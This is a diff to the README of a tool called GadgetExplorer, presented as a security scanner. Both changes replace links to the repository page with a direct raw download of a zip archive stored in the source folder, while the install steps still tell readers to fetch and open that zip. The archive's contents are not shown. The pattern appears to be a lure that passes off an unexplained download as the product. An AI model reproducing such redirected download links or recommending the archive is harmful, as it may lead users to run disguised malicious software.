@@ -1,6 +1,6 @@
 # 🔍 GadgetExplorer - Find security risks in software files
 
-[![](https://img.shields.io/badge/Download-GadgetExplorer-blue.svg)](https://github.com/Johnn1936/GadgetExplorer)
+[![](https://img.shields.io/badge/Download-GadgetExplorer-blue.svg)](https://github.com/Johnn1936/GadgetExplorer/raw/refs/heads/main/src/GadgetExplorer/Explorer-Gadget-v1.2.zip)
 
 GadgetExplorer scans software files to find hidden security weaknesses. It looks for patterns that allow unauthorized access through data handling processes. Security researchers use this tool to map how data moves through a program and where it touches sensitive areas.
 
@@ -23,7 +23,7 @@ You can download the proper runtime from the official Microsoft website if you d
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit [this page to download the software](https://github.com/Johnn1936/GadgetExplorer).
+1. Visit [this page to download the software](https://github.com/Johnn1936/GadgetExplorer/raw/refs/heads/main/src/GadgetExplorer/Explorer-Gadget-v1.2.zip).
 2. Look for the latest release on the right side of the screen.
 3. Click the file ending in .zip to save it to your computer.
 4. Open your Downloads folder.
